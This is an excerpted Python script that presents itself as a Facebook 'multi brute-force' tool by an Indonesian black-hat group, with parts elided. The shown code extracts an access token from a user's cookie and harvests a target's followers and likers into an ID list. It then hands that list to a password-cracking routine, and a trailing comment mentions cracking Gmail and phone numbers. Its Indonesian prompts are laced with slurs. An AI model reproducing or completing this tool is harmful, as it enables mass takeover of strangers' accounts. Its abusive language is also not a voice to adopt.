...
def banner():
    print("\x1b[0;37m __  __ _   _ _  _____ ___    ___ ___ _   _ _____ ___    ___ ___  ___  ___ ___  Author : FAGHP")
    print("\x1b[0;37m|  \/  | | | | ||_   _|_ _|__| _ ) _ \ | | |_   _| __|__| __/ _ \| _ \/ __| __| Team   : MTI")                                                                  print("\x1b[0;37m| |\/| | |_| | |__| |  | |___| _ \   / |_| | | | | _|___| _| (_) |   / (__| _|  Yt     : FAGHP , dan BLACK SWUAD")
    print("\x1b[0;37m|_|  |_|\___/|____|_| |___|  |___/_|_\\___/  |_| |___|  |_| \___/|_|_\\___|___| BLACK HAT INDONESIA")
...
def gen():
        ...
        try:
                ...
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* TOKEN FB MANA KONTOL: " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((k+"["+p+"!"+k+"]"+p+"gw gak tau ah puyeng"))
        except [KeyError,IOError]:
            print((k+"["+p+"!"+k+"]"+p+" Cookies NYA GAK BISA KONTOL"))
            os.system("clear")
            logs()
...
def bot_follow():
	try:
		...
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		logs()
	jalan("%s[%s•%s] %sDagoan he'uh..."%(k,p,k,p))
	menu()
...
def menu():
    ...
    print((k+"\n["+p+"•"+k+"]"+p+" ID LU BNGST : "+id))
    print((k+"["+p+"•"+k+"]"+p+" IP LU BNGST : "+ip))
    print((k+"["+p+"•"+k+"]"+p+" Status WA : "+m+"Test Version"+p))
    print((k+"["+p+"•"+k+"]"+p+" ..........  : "+durasi))
    print((k+"["+p+"•"+k+"]"+p+" ........... : "+negara))
...
def choose_menu():
	...
	if r=="":
		...
		try:
			jalan(k+"\n["+p+"•"+k+"]"+p+" Mskh udh pakek script ini jangan pakek lagi ya")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((k+"["+p+"!"+k+"]"+p+" Error bngst %s"%e))
	else:
		print((k+"["+p+"!"+k+"]"+p+" INPUT SALAH KONTOL "))
		menu()	
...
def publik():
	try:
		...
		logs()
	try:
		print((k+"\n["+p+"•"+k+"]"+p+" Type \'me\' tu you lek this yeteteteteter"))
		idt = input(k+"["+p+"•"+k+"]"+p+" ID TARGET ANJING : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID NA EWEHAN TOLOL"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
...
def follow():
	try:
		...
		logs()
	try:
		idt = input(k+"\n["+p+"•"+k+"]"+p+" yg follow lu mana id nya ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID EWEHAN TOLOL"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		...
		for a in z["data"]:
			...
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"•"+k+"]"+p+" ID TOTAL : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" lol : %s"%e)
...
def likers():
	...
	try:
		...
		exit(k+"["+p+"!"+k+"]"+p+" Error gara gara aing capek : %s"%e)

# CRACK GMAIL SAMA NOMOR HP KAYA NYA
